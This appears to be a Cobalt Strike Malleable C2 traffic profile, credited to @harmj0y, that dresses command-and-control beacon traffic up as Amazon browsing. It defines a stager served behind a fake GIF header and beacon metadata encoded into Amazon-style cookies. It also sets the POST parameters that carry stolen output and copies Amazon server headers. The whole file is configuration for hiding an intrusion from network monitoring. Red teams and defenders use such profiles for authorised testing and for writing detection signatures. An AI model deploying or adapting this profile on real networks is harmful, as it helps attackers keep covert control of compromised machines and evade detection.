#
# Amazon browsing traffic profile
# 
# Author: @harmj0y
#

set sleeptime "5000";
set jitter    "0";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

http-stager {
	set uri_x86 "/release/cs/stager.gif";
	set uri_x64 "/release/cs/stager.gif";
	client {
		parameter "id" "1234";
		header "Cookie" "imissu";
	}

	server {
		header "Content-Type" "image/gif";
		output {
			prepend "GIF89a";
			print;
		}
	}
}

http-get {

    set uri "/release/cs/cmd";

    client {

        header "Accept" "*/*";

        metadata {
            base64;
            prepend "session-token=";
            prepend "skin=noskin;";
            append "csm-hit=s-24KU11BB82RZSYGJ3BDK|1419899012996";
            header "Cookie";
        }
    }

    server {

        header "Server" "Server";
        header "x-amz-id-1" "THKUYEZKCKPGY5T42PZT";
        header "x-amz-id-2" "a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";

        output {
            print;
        }
    }
}

http-post {
    
    set uri "/release/cs/us.sr.aps";

    client {

        header "Accept" "*/*";
        header "Content-Type" "application/octet-stream";
        header "X-Requested-With" "XMLHttpRequest";	
	
        parameter "sz" "160x600";
        parameter "oe" "oe=ISO-8859-1;";

        id {
            parameter "sn";
        }

        parameter "s" "3717";

        output {
	    base64;
            print;
        }
    }

    server {

        header "Server" "Nginx";
        header "x-amz-id-1" "THK9YEZJCKPGY5T42OZT";
        header "x-amz-id-2" "a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo=";
        header "X-Frame-Options" "SAMEORIGIN";
        header "x-ua-compatible" "IE=edge";

        output {
            print;
        }
    }
}